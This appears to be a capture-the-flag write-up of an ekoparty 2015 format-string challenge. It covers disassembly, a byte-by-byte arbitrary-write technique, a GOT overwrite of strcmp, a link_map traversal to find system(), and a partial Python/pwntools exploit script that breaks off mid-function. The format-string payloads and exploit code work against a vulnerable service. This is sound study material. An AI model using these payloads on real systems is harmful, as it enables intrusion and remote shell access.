<p>From the raw dump, we reconstructed parts of the binary. We came across a string that said &ldquo;OMG! Well done, here&rsquo;s your flag&rdquo; or something along those lines. Looking through the raw dump, we found where that string is referenced. Disassembling with radare2 gave us this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bas@tritonal:~$ rasm2 -d -o 0x13370861 -
</span><span class='line'>7517c7442404970a37138d45e7890424e86afcffff85c074188d45e789442404c704249a0a3713e883fcffffe9a52a2a2ac70424a20a3713e872fcffff8d45e7890424e867fcffffc70424a60a3713e8cbfcffff8d45e789442404c70424a70a3713e828fcffff85c07566c70424c40a3713e838fcffffa10821371389442404c70424c1203713e8f0fdffff8945dca10821371389442404c70424cc2037130cd8fdffff8945e08b4545dc890424e8f6fbffff8b45dc890424
</span><span class='line'>disassemble error at offset 162
</span><span class='line'>jnz 0x1337087a
</span><span class='line'>mov dword [esp+0x4], 0x13370a97
</span><span class='line'>lea eax, [ebp-0x19]
</span><span class='line'>mov [esp], eax
</span><span class='line'>call dword 0x133704e0
</span><span class='line'>test eax, eax
</span><span class='line'>jz 0x13370892
</span><span class='line'>lea eax, [ebp-0x19]
</span><span class='line'>mov [esp+0x4], eax
</span><span class='line'>mov dword [esp], 0x13370a9a ; 
</span><span class='line'>call dword 0x13370510       ; puts? (value in got is 0xb7e76c40)
</span><span class='line'>jmp dword 0x3d613337
</span><span class='line'>mov dword [esp], 0x13370aa2 ; Hi
</span><span class='line'>call dword 0x13370510
</span><span class='line'>lea eax, [ebp-0x19]
</span><span class='line'>mov [esp], eax
</span><span class='line'>call dword 0x13370510
</span><span class='line'>mov dword [esp], 0x13370aa6
</span><span class='line'>call dword 0x13370580       ; ? (value in got is 0xb7e8ec10)
</span><span class='line'>lea eax, [ebp-0x19]
</span><span class='line'>mov [esp+0x4], eax
</span><span class='line'>mov dword [esp], 0x13370aa7 ; Welcome to ekoparty 2015!
</span><span class='line'>call dword 0x133704f0       ; strcmp? (value in got is 0xb7f60b60)
</span><span class='line'>test eax, eax
</span><span class='line'>jnz 0x13370932
</span><span class='line'>mov dword [esp], 0x13370ac4 ; OMG! nice work, your flag is:
</span><span class='line'>call dword 0x13370510       ; puts?
</span><span class='line'>mov eax, [0x13372108]       ; -&gt; 0x13373008, contains '47fa'
</span><span class='line'>mov [esp+0x4], eax
</span><span class='line'>mov dword [esp], 0x133720c1 ; qs'HG, 7173271f..
</span><span class='line'>call dword 0x133706dd       ; see below
</span><span class='line'>mov [ebp-0x24], eax
</span><span class='line'>mov eax, [0x13372108]
</span><span class='line'>mov [esp+0x4], eax
</span><span class='line'>mov dword [esp], 0x133720cc ; 0x1d0a0c56
</span><span class='line'>or al, 0xd8
</span><span class='line'>std
</span><span class='line'>invalid</span></code></pre></td></tr></table></div></figure>


<p>Since our input can never be larger than 12 bytes, we can never win the strcmp with <code>Welcome to ekoparty 2015</code>. From here, we tried a lot of things. The 12 char input limit was annoying, cos we couldn&rsquo;t really write anything, anywhere:</p>

<p><code>A\xde\xad\xbe\xef%255c%8$hn</code> was 15 chars&hellip; So we set out to make a write() function using the format string vuln.</p>

<p>On the stack, there are many DWORDS. Some of them contain stack addresses. Some of those addresses refer to other stack addresses (they&rsquo;re usually stack frame pointers). Using three memory positions, we could construct a write function using format string argument 25, 61 and 124 (ASLR is off so the addresses remain constant). Here&rsquo;s how:</p>

<p>$25 contains the address of $61. Let&rsquo;s assume $25 contains 0xfffff080.</p>

<p>$61 is at 0xfffff080 and contains 0xfffff1a0, which is $124 (math doesn&rsquo;t work out but bear with me).</p>

<p>$124 contains nothing of interest, and isn&rsquo;t used by the binary.</p>

<p>If we now use the format string, we use $61 to write to $124, and $25 to update $61. Finally, once we&rsquo;ve written out an address in $124, we can use the format string to write to that location.</p>

<p>Let&rsquo;s assume we want to write 0x41414141 to 0x804b020. We first do this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>%32c%61$hhn (write 0x20 to 0xfffff1a0). </span></code></pre></td></tr></table></div></figure>


<p>Then, we update the pointer at $61 by writing to $25:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>%161c%25$hhn</span></code></pre></td></tr></table></div></figure>


<p>So $61 will now contain 0xfffff1a1. Then we write to $124 again via $61:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>%176c%61$hhn (write 0xb0 to 0xfffff1a1). </span></code></pre></td></tr></table></div></figure>


<p>Etc until we have 0x804b020 at $124. Then we write using $124:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>%65c%124$hhn</span></code></pre></td></tr></table></div></figure>


<p>And we&rsquo;ll have written the first byte to 0x804b020. We repeat this process for the other bytes&hellip;</p>

<p>With our new and shiny write() function we set out to break this challenge. We first tried truncating the string &ldquo;Welcome to ekoparty 2015!&rdquo; in memory, so we could have an input that would fit the 12 char limit. Writing to that location didn&rsquo;t work, presumably cos that string was in non-writeable memory. Remember, we needed to enter the code path here:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mov dword [esp], 0x13370aa7 ; Welcome to ekoparty 2015!
</span><span class='line'>call dword 0x133704f0       ; strcmp? (value in got is 0xb7f60b60)
</span><span class='line'>test eax, eax
</span><span class='line'>jnz 0x13370932
</span><span class='line'>mov dword [esp], 0x13370ac4 ; OMG! nice work, your flag is:
</span><span class='line'>call dword 0x13370510       ; puts?
</span><span class='line'>mov eax, [0x13372108]       ; -&gt; 0x13373008, contains '47fa'
</span><span class='line'>mov [esp+0x4], eax
</span><span class='line'>mov dword [esp], 0x133720c1 ; qs'HG, 7173271f..
</span><span class='line'>call dword 0x133706dd       ; see below
</span><span class='line'>mov [ebp-0x24], eax
</span><span class='line'>mov eax, [0x13372108]
</span><span class='line'>mov [esp+0x4], eax
</span><span class='line'>mov dword [esp], 0x133720cc ; 0x1d0a0c56</span></code></pre></td></tr></table></div></figure>


<p>We dumped and reversed the function at <code>0x133720cc</code>, which apparently decodes the flag. However, we where only able to get the pieces <code>EKO{</code> and <code>b4by</code>. The dump process wasn&rsquo;t perfect, so we continued.</p>

<p>So how could we get strcmp() to return 0? By overwriting the value in the got with a location that does <code>xor eax, eax; ret</code>. We dumped bytes around the strcmp pointer (ASLR was off so libc was at a static position) and indeed, we identified a rop-like gadget that did just that! Careful overwriting of the got pointer of strcmp in two steps was necessary, but again we lucked out: strcmp was at 0xb7f60b60, the <code>xor eax, eax</code> gadget was at 0xb7f61fc4. At 0xb7f61c60, there was this perfect gadget:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>movzx ecx, byte [eax+0x5]
</span><span class='line'>movzx eax, byte [edx+0x5]
</span><span class='line'>sub eax, ecx
</span><span class='line'>ret</span></code></pre></td></tr></table></div></figure>


<p>In two steps, we overwrote strcmp (we can&rsquo;t have the got pointer pointing to illegal instructions, cos that would make the binary crash before we can overwrite the next value!) with the xor eax gadget&hellip; and we got something like this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>OMG! nice work, your flag is: EKO{</span></code></pre></td></tr></table></div></figure>


<p>And then nothing?! We overwrote the free() got pointer with puts and this dumped more text, convincing us that the overwrite was working correctly. This lead us to believe the binary was broken&hellip; Which indeed it turned out to be, later on.</p>

<p>Next, loads of failed attempts later, we stumbled upon <a href="https://wapiflapi.github.io/2014/11/17/hacklu-oreo-with-ret2dl-resolve/">this writeup of another challenge</a> that uses ret2dl. In other words, abuse the symbol resolver. Quickly after that, we found another good writeup, using a slightly easier technique. It <a href="https://github.com/mrmacete/writeups/tree/master/wapiflapi-exrs/sploit/s7">traverses the link_map</a> found in memory to grab <code>system()</code>.</p>

<p>This turned out to work. We traversed the link_map by hand, adjusting the leaked bytes from time to time (remember, printf chokes on nul bytes).</p>

<p>At the start of the got, we find these bytes:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>0x13371f14 ; .dynamic
</span><span class='line'>0xb7fff938 ; *link_map
</span><span class='line'>0xb7ff24f0 ; *dl-resolve</span></code></pre></td></tr></table></div></figure>


<p>We take 0xb7fff938, the *link_map, and dump from there. link_map looks like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">struct</span> <span class="n">link_map</span>
</span><span class='line'>  <span class="p">{</span>
</span><span class='line'>    <span class="cm">/* These first few members are part of the protocol with the debugger.</span>
</span><span class='line'><span class="cm">       This is the same format used in SVR4.  */</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">ElfW</span><span class="p">(</span><span class="n">Addr</span><span class="p">)</span> <span class="n">l_addr</span><span class="p">;</span>          <span class="cm">/* Base address shared object is loaded at.  */</span>
</span><span class='line'>    <span class="kt">char</span> <span class="o">*</span><span class="n">l_name</span><span class="p">;</span>               <span class="cm">/* Absolute file name object was found in.  */</span>
</span><span class='line'>    <span class="n">ElfW</span><span class="p">(</span><span class="n">Dyn</span><span class="p">)</span> <span class="o">*</span><span class="n">l_ld</span><span class="p">;</span>            <span class="cm">/* Dynamic section of the shared object.  */</span>
</span><span class='line'>    <span class="k">struct</span> <span class="n">link_map</span> <span class="o">*</span><span class="n">l_next</span><span class="p">,</span> <span class="o">*</span><span class="n">l_prev</span><span class="p">;</span> <span class="cm">/* Chain of loaded objects.  */</span>
</span><span class='line'>  <span class="p">};</span>
</span></code></pre></td></tr></table></div></figure>


<p>So at 0xb7fff938 we find:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="mh">0x746e450a</span> <span class="p">;</span> <span class="n">base_addr</span><span class="p">..</span> <span class="n">not</span> <span class="n">correct</span> <span class="n">due</span> <span class="n">to</span> <span class="n">printf</span>
</span><span class='line'><span class="mh">0xb7fffc24</span> <span class="p">;</span> <span class="n">name</span><span class="o">!</span> <span class="n">empty</span>
</span><span class='line'><span class="mh">0x13371f14</span> <span class="p">;</span> <span class="n">the</span> <span class="n">bin</span> <span class="n">itself</span><span class="p">...</span> <span class="n">not</span> <span class="n">useful</span><span class="p">.</span>
</span><span class='line'><span class="mh">0xb7fffc28</span> <span class="p">;</span> <span class="n">ptr</span><span class="o">-&gt;</span><span class="n">next</span>
</span></code></pre></td></tr></table></div></figure>


<p>This is the binary. On to the next one at 0xb7fffc28, which was linux-gate&hellip; Then the next one was indeed libc! This was confirmed by reading link_map->l_name. We now had the dynamic section of libc, time to parse it for system. Soon, using the printf format string vulnerability and a messy python script, we were dumping symbols. After about an hour, we hit the jackpot:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Opening</span> <span class="n">connection</span> <span class="n">to</span> <span class="n">challs</span><span class="p">.</span><span class="n">ctf</span><span class="p">.</span><span class="n">site</span> <span class="n">on</span> <span class="n">port</span> <span class="mi">20002</span><span class="o">:</span> <span class="n">Done</span>
</span><span class='line'><span class="mh">0xb7e2dec8</span> <span class="mh">0x0</span>
</span><span class='line'><span class="mh">0xb7e2ded8</span> <span class="mh">0x1da8</span>
</span><span class='line'><span class="mi">1768709983</span> <span class="n">__li</span>
</span><span class='line'><span class="mh">0x0</span>
</span><span class='line'><span class="mh">0xb7e2dee8</span> <span class="mh">0xbde</span>
</span><span class='line'><span class="mi">1819570783</span> <span class="n">_rtl</span>
</span><span class='line'><span class="mh">0x0</span>
</span><span class='line'><span class="mh">0xb7e2def8</span> <span class="mh">0x45d1</span>
</span><span class='line'><span class="mi">1768709983</span> <span class="n">__li</span>
</span><span class='line'><span class="mh">0x0</span>
</span><span class='line'><span class="mh">0xb7e2df08</span> <span class="mh">0x13f4</span>
</span><span class='line'><span class="p">...</span>
</span><span class='line'><span class="mh">0xb7e2f948</span> <span class="mh">0x3176</span>
</span><span class='line'><span class="n">signal</span>
</span><span class='line'><span class="mh">0xb7e2f9a8</span> <span class="mh">0xeab</span>
</span><span class='line'><span class="n">puts</span>
</span><span class='line'><span class="mh">0xb7e30208</span> <span class="mh">0xa3e</span>
</span><span class='line'><span class="o">&lt;</span><span class="n">empty</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="mh">0xb7e30588</span> <span class="mh">0x3063</span>
</span><span class='line'><span class="n">__libc_system</span>
</span><span class='line'><span class="n">Enter</span> <span class="n">your</span> <span class="nl">name</span><span class="p">:</span>
</span><span class='line'><span class="p">[</span><span class="o">!</span><span class="p">]</span> <span class="n">found</span> <span class="n">system</span><span class="o">!</span><span class="mh">0x3fcd0</span> <span class="mh">0xb7e69cd0</span>
</span></code></pre></td></tr></table></div></figure>


<p>We had the address of system! Now, the plan of attack was as follows:</p>

<ul>
<li>write <code>/bin/sh</code> to 0x13373008, which gets used in a free() call</li>
<li>overwrite free@got with system</li>
<li>set strcmp to the <code>xor eax, eax; ret</code> gadget</li>
<li>receive shell</li>
</ul>


<p>This <em>almost</em> worked out, but we set strcmp to 0xb7f61f60 and that turned out to be enough. We landed a shell!</p>

<p>The poc we used:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">socket</span><span class="o">,</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">telnetlib</span><span class="o">,</span> <span class="nn">time</span>
</span><span class='line'><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'>
</span><span class='line'><span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s">&#39;i386&#39;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s">&#39;linux&#39;</span><span class="p">)</span>
</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>        <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">read1</span><span class="p">(</span><span class="n">address</span><span class="p">):</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="si">%64c</span><span class="s">%25$hhn&quot;</span><span class="p">)</span>           <span class="c"># 0xbffff940</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%&quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;c%61$hhn&quot;</span><span class="p">)</span>           <span class="c"># set byte at 0xbf..40 to &#39;3c&#39;</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">300</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">address</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">):</span>
</span><span class='line'>      <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="si">%64c</span><span class="s">%25$hhn&quot;</span><span class="p">)</span>           <span class="c"># 0xbffff940</span>
</span><span class='line'>      <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
</span><span class='line'>      <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%&quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">address</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;c%61$hhn&quot;</span><span class="p">)</span>           <span class="c"># set byte at 0xbf..40 to &#39;3c&#39;</span>
</span><span class='line'>      <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">300</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="si">%65c</span><span class="s">%25$hhn&quot;</span><span class="p">)</span>           <span class="c"># next byte, 0xbffff941</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%&quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">((</span><span class="n">address</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;c%61$hhn&quot;</span><span class="p">)</span>           <span class="c"># set byte at 0xbf..41 to &#39;20&#39;</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">300</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="si">%66c</span><span class="s">%25$hhn&quot;</span><span class="p">)</span>           <span class="c"># next byte, 0xbffff942</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%&quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">((</span><span class="n">address</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;c%61$hhn&quot;</span><span class="p">)</span>           <span class="c"># set byte at 0xbf..42 to &#39;37&#39;</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">300</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="si">%67c</span><span class="s">%25$hhn&quot;</span><span class="p">)</span>           <span class="c"># final byte, 0xbffff943</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%&quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">((</span><span class="n">address</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;c%61$hhn&quot;</span><span class="p">)</span>           <span class="c"># set byte at 0xbf..43 to &#39;13&#39;</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">300</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%124$s&quot;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
</span><span class='line'>  <span class="k">if</span> <span class="n">data</span><span class="p">[</span><span class="mi">4</span><span class="p">:</span><span class="mi">7</span><span class="p">]</span> <span class="o">==</span> <span class="s">&#39;Ent&#39;</span><span class="p">:</span>
</span><span class='line'>      <span class="k">return</span> <span class="mi">0</span>
</span><span class='line'>  <span class="k">return</span> <span class="nb">ord</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">3</span><span class="p">:</span><span class="mi">4</span><span class="p">])</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">read4</span><span class="p">(</span><span class="n">address</span><span class="p">):</span>
</span><span class='line'>  <span class="n">value</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
</span><span class='line'>      <span class="c">#value &lt;&lt;= 8</span>
</span><span class='line'>      <span class="n">value</span> <span class="o">+=</span> <span class="n">read1</span><span class="p">(</span><span class="n">address</span><span class="o">+</span><span class="n">i</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="mi">8</span><span class="o">*</span><span class="n">i</span><span class="p">)</span>
</span><span class='line'>      
</span><span class='line'>  <span class="k">return</span> <span class="n">value</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">leak</span><span class="p">(</span><span class="n">address</span><span class="p">):</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="si">%64c</span><span class="s">%25$hhn&quot;</span><span class="p">)</span>           <span class="c"># 0xbffff940</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%&quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;c%61$hhn&quot;</span><span class="p">)</span>           <span class="c"># set byte at 0xbf..40 to &#39;3c&#39;</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">300</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">address</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">):</span>
</span><span class='line'>      <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="si">%64c</span><span class="s">%25$hhn&quot;</span><span class="p">)</span>           <span class="c"># 0xbffff940</span>
